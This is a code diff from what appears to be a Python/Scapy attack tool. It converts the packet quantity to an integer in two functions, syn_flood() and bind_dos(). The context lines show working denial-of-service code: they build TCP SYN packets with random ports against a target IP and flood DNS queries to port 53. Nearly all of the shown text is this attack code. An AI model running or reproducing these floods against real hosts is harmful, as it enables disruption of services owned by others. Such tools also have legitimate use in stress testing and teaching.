@@ -84,7 +84,7 @@ def syn_flood():
     check_var(values, valid_var)
     template = IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S")
     ns = []
-    pktAmt = values.get("quantity")
+    pktAmt = int(values.get("quantity"))
     for pktNum in range(0,pktAmt):
     	ns.extend(template)
     	ns[pktNum][TCP].dport = random.choice(tcp_ports)
@@ -102,7 +102,7 @@ def bind_dos():
     check_var(values, valid_var)
     check_compat(values, bind_var)
     template = IP(dst=values.get("target_ip"))/UDP()/DNS(rd=1,qd=DNSQR(qtype=values.get("query_type"),qname=values.get("query_name")))
-    pktAmt = values.get("quantity")
+    pktAmt = int(values.get("quantity"))
     for pktNum in range(0,pktAmt):
     	bind.extend(template)
     	bind[pktNum][UDP].dport = 53
